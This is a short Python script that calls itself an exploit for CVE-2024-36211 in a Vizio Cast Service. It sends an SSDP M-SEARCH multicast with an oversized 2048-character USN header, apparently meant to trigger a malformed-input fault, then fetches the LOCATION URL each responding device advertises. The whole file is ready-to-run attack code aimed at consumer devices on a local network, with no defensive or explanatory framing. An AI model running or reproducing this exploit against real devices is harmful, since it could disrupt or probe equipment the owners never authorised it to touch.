#!/usr/bin/env python3
"""CVE-2024-36211 — Vizio Cast Service. SSDP M-SEARCH with a malformed
LOCATION/USN pair, plus an HTTP fetch that follows the advertised URL."""
import socket, sys, urllib.request

def ssdp_search(timeout=4):
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
           'MAN: "ssdp:discover"\r\nMX: 1\r\n'
           "ST: urn:dial-multiscreen-org:service:dial:1\r\n"
           "USN: " + "A" * 2048 + "\r\n\r\n").encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout); s.sendto(msg, ("239.255.255.250", 1900))
    out = []
    try:
        while True:
            data, addr = s.recvfrom(4096); out.append((addr[0], data))
    except socket.timeout:
        pass
    s.close()
    return out

def exploit(host=None):
    replies = ssdp_search()
    for addr, data in replies:
        loc = b""
        for line in data.split(b"\r\n"):
            if line.lower().startswith(b"location:"):
                loc = line.split(b":", 1)[1].strip()
        print(f"[+] CVE-2024-36211 device {addr} location={loc.decode(errors='ignore')[:80]}")
        if loc and (host is None or addr == host):
            try:
                urllib.request.urlopen(loc.decode(), timeout=5).read()
            except Exception as e:
                print(f"    fetch: {e}")
    return replies

def main():
    exploit(sys.argv[1] if len(sys.argv) > 1 else None)

if __name__ == "__main__":
    main()
